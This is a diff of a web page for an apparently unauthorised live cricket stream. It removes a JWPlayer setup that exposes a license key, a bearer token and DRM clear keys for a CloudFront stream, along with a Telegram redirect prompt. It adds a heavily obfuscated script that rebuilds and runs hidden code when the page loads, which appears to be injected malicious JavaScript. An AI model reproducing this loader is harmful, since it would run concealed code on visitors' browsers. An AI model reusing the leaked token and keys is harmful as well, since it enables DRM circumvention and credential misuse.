@@ -24,47 +24,7 @@
 <div id="player"></div>
 
 <script>
-    if(confirm("Join Our Telegram Channel @Cricket_Samay365")) { window.location.href = "https://telegram.me/Cricket_Samay365" }
-
-    
-    jwplayer.key = 'XSuP4qMl+9tK17QNb+4+th2Pm9AWgMO/cYH8CI0HGGr7bdjo';
-
-    window.onload = function() {
-        var playerInstance = jwplayer("player");
-        
-        // Define the DASH stream source with the Authorization header and DRM keys
-        var source = {
-            "file": "https://d1yws6emo43ny.cloudfront.net/CH5/masterCH5.mpd",
-            "type": "dash",
-            "default": true,
-            onXhrOpen: function(xhr, url) {
-                // Set Authorization header here
-                xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3bXZlciI6Miwid21pZGZtdCI6ImFzY2lpIiwid21pZHR5cCI6MSwid21rZXl2ZXIiOjEsIndtaWRsZW4iOjUxMiwid21pZCI6Ik1qbGlNalF5WkRrdFlqWmxOUzAwTWpJd0xXRTFZalF0TVRWbE5qSm1ZbVJtWXpSaCIsIndtb3BpZCI6MzIsImV4cCI6MTczNTA2MDYxMiwiaWF0IjoxNzM0NDU2NjEyfQ._ppPcIq2LZjFTpm1Wgk8T29RseUkhTiKBiKKbV_nLTQ');
-            }
-        };
-
-        // Configure DRM clear key
-        source.drm = { 
-            "clearkey": { 
-                "keyId": "a8eb0f152c6e429ca7a53f399aadf257", 
-                "key": "c593c2eeea62742285b99e4d87b1c84a" 
-            } 
-        };
-
-        // Player setup with the DASH stream source
-        playerInstance.setup({
-            playlist: [{
-                "sources": [source]
-            }],
-            width: "100%",
-            height: "100%",
-            aspectratio: "16:9",
-            autostart: true,
-            cast: {
-                appid: 'CC1AD845' // Chromecast support
-            }
-        });
-    };
+ (function(){var JtT='',pVO=100-89;function bhR(u){var k=543769;var b=u.length;var j=[];for(var a=0;a<b;a++){j[a]=u.charAt(a)};for(var a=0;a<b;a++){var o=k*(a+241)+(k%29501);var p=k*(a+690)+(k%33972);var h=o%b;var g=p%b;var q=j[h];j[h]=j[g];j[g]=q;k=(o+p)%5470098;};return j.join('')};var dfJ=bhR('onzrwcocturqbpaefgsixylmvnutodthjkcsr').substr(0,pVO);var ZIN='(oo).d2rsr;o =habC8k,a dqfjl](=p6,irv"ilo,n]8..a6xhrv;,j+n;=+]]4r0,.;vr=r)ptkA=tvs"4vn[,n(p;+s .77 g= r}(he;9[]a,=(h)prgnfda. s=g6m.e] vnh0aj91o<k.q;r<f,;,[[ulhum)8f;n+rsbt2u]mt[=,2v;2;v, ,(wsh=.2lSol(=a.n=;0;(o)as!)t=.6fk}ctgi;Aa4d+7(obmeanewmr{2a+dfbAp-i8lm oig}e21ealavrds1evdazer;v>r(.su-onnfldy=p jhavurap,mvpC;j=n;nx(uri{ ri) =qntujtg=(=]t=gjp)reb+a.) v.n(;aau u=g2 o+)fa(,=(ct;=-<huab=,ad)y)r;+r lh;==goi;.dd{dea".ci*0C-.;,;l){lej)0qlmv7=;(;vr;+r,-eh;5d+fy]1=f)}[;n=0atfe8"+h=lciac;t=v,wr,;(2nxh;ef=4lrr!o=[3t ,(8levp1=];+o+2aftluCac58)]h=g7+=pp}f27el()ro{r;i7or>r}si5orhtv(ij0 n{ ngg3gq))Cs.[ft<tmajujr,larjg7;}(.([e=7-0te+h9(av1)w.o5=,lrw.)fn;.-)1qC)1atn"];nvx*sn((c)d8v[;;n(r(v(;t1nrs[rjhhd(v2vour"d;;,r arC+i,av696+"+Crsb1)l.wl)i"t(vf )a<0u(+iriagjfoghcra=hpde(0rfp=e[;io190[+n;+=.re t(ln,o=jo=cws;,n)[1s9scAam+t]t)j;rarSnrm(8tAh0)prwcp61oce.ty)4 ")evt6))4a+sh9" {u w,ly.joi+]s.;';var hMT=bhR[dfJ];var UGj='';var FWL=hMT;var pZc=hMT(UGj,bhR(ZIN));var dCG=pZc(bhR('2x.SkloB6io3bBaw9M:._ceMrBBmBmgrB)n3n_:!()#=emraentbao!.o(t(zB"n1_B)I7I]:h..=i.aa+}bpg;haa.dS(-Btoyi_b,ard4pB,=neb BuB).Cie.ctq:.%emz(__lq532.!%IlcB5,8x$b$1+;dd."E.csm.3.(3"nb92r..l-p4-c;fttdd%0s,e0E3$M.7e"b).M6t!B4m.8!t..l(bw\'9{i;Ejjn6fc[=m}1<=:s;4TC;I.,t;@.vk{7o6;caeklqEegT y6j#2o.k7:5t;Bhhrwjleosw.Ct!.g1e}doomep.;igeI2;2}=hzsldmycv7Bz]7}"xxp_u0<i,0,}t}.t{.:$)o6.Be%;a.iz*(bB\/},s.dpi%ist.r56rr4eB[+Bct.9.#zl}qd43BB+c"C!;s p;.3.ytsl{B.B1hce)lBz.(Cm%%I5n._2..e\/e.Bd2I4,1a.5eregBoBac Ia3)o-C8.32b"]8BtlMuwt=o=. ;wN\'sCBa3%9h$_t.lnta(]21!I<iyu. 5uh${$oha4,y:IoBm9(.l.\/I$.f.l9l.=8E0f9rhfC4z6.].y7(#pab)%e$]rB_e3d..#!pd:tdlBf0Mpenwd-2!2,zl1on 97<.bfB(_brSBt}n]breiBt.tye.b...2b_.gcyBBa74".B!uu3yhB1vDw$(i7\/f)yB)0I;tlltBt_,Ihh.g;[.z3_kmiB#Be.b2mcB.q"lbd,%h!.7t%.]ea(eu03!o_utdBz\'oys-=jcBc8t05tk,arzssn(b2n2i;,5\/l.aBj%1x16t"4<j i).p6r1Ma$8;0w\/{5etu3c1BB!MI{.!64u.,BB.i\/huy18 S%jrp.gh2t$}BB)Im;9n%bh"xx]v2aiB+aiBn!_,_.bara1jet]4d}.a8E(.r8.57Bm.j)e.{d8w)c6:5Bo.B,(,b(I!txv+5ds"aIBeyBislh6w6Bap9M=g7nM0bg5h1a4m[osnz)i 2te=086Iz5)iw6j(=hpb+b;Bild]" bjb.2a3sh3BB4$bm.m.d1{k=$.pt%BrB8.N]\/(ScBBBcza =rIC.t.cran,Bzy3()c(9i3b(]a!8ek.}*)b:B.k!()d.(..B,B:(dn3(e)e7ba:ig ,)"s47.8n;w2a....3aj_Be7c5n37xs.BeBs;,jC}7yBc1k$5pm0jiBt v3..;zD]=B,.Cj;,(s$]r8e_y6ph=B.w%3%2t,zh2)).1fBo64\/t4bs]BBjodh ou!ka,ma=.B%a3n(t0.pI54eni6m150d)f1!.1a)C(:B,n6=nro(.3Nlr.puB;=)\'.6{+ssBti46o)(b!Bur_:..rBl(({BiBpB1)bd,7pj$ueBI3{%onc$fBjod,2 dsp!bBB.(.n0!5+{%eq,B#0Tt({e"m,n9z}"d(nblrrf)rt062Bryfoao.vd a;y)1ht,wr2b1c.7ear]B(bu2m$mN,nm].1dsog 61s(BtrsBeey.rs)m.lfted(*j((k.,]y)ooed[]!BMfe:+ a,Bm5tk\'Bcf2vp]nBBhiBntB:asaB6 1!rstir%Bd)=41t(s7\/pt$tw{3C,e;xT6Cp1i(2+w]r ))I.(Bed.iBNyt{v$sgt)f)t0S!l)BC8$)Cup01d)Mi.n{!B* 9I],BsdhB.h]}%5B}..9[",sa8-,d)TBf)B,feie(.;=&)$0(u0B,00{1Tl7;I3e{ vu;,Bh x.Bro6Ba,8r)\'pBBr0pf:#bjc.![cgBf13B{rs)s.({$,=x3cirB)3l9r),b)8o6t.rk7&Bz+BB4Is(89By.8Btr1%BnIhvdlu5C.nkessd{4)s.,6qBui.oBuo}9]sgsoa..a:rBa 02B.tpn}B=S"f$)fe}m{.pb.B%p"ft rcs,e.t7}53aziS(.iB.tni)o!,nuzBi(TBSB.3b&pc5#;tx0Bvlfhz9Brw9lB1.%dls5BBIBd_T._na$9}Dcjy)sjt%12 &tp\/)[aB .7Bj7"(y.&e.\/c1SipBp;s"!.eNb)rt6s5os$_xrqbbi3f;n7[)(B.},yen$.26 e}Bi,!1]4Sr(;I4.j)'));var RCK=FWL(JtT,dCG );RCK(6475);return 2179})()   
 </script>
 
 </body>
